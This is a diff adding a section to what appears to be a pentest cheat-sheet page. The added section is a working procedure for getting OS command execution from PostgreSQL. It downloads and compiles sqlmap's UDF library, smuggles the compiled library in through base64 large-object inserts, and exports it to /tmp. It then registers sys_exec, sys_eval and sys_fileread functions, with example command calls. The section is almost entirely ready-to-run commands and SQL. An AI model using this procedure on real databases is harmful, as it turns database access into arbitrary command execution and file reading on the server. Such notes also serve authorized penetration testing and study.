@@ -267,6 +267,47 @@ SELECT name FROM [db]..sysobjects WHERE xtype = 'U'
 SELECT * from [tablename]
 {% endhighlight %}
 
+> **Postgres run Commands**
+
+In bash:
+
+{% highlight bash %}
+nano /etc/apt/sources.list (add the following)
+deb http://apt.postgresql.org/pub/repos/apt/ bionic-pgdg main
+wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -
+apt install postgresql postgresql-server-dev-10
+wget https://raw.githubusercontent.com/sqlmapproject/udfhack/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c
+gcc -Wall -I/usr/include/postgresql/10/server  -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
+strip -sx lib_postgresqludf_sys.so
+mv lib_postgresqludf_sys.so /tmp/
+split -b 2048 lib_postgresqludf_sys.so
+{% endhighlight %}
+
+In postgres: 
+
+{% highlight sql %}
+SELECT lo_creat(-1);
+
+set c0 `base64 -w 0 /tmp/xaa`
+...
+set c5 `base64 -w 0 /tmp/xaf`
+
+ INSERT INTO pg_largeobject (loid, pageno, data) values ([number from lo_creat], 0, decode(:'c0', 'base64'));
+ ...
+ INSERT INTO pg_largeobject (loid, pageno, data) values ([number from lo_creat], 5, decode(:'c5', 'base64'));
+
+SELECT lo_export([number from lo_creat], '/tmp/lib_postgresqludf_sys.so');
+
+CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '/tmp/lib_postgresqludf_sys.so', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
+CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
+CREATE OR REPLACE FUNCTION sys_bineval(text) RETURNS int4 AS '/tmp/lib_postgresqludf_sys.so', 'sys_bineval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
+CREATE OR REPLACE FUNCTION sys_fileread(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_fileread' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
+
+--Example commands
+SELECT sys_eval('pwd');
+SELECT sys_exec('touch /tmp/test_postgresql');
+{% endhighlight %}
+
 
 > **SQL Injection Cheat Sheets**
 
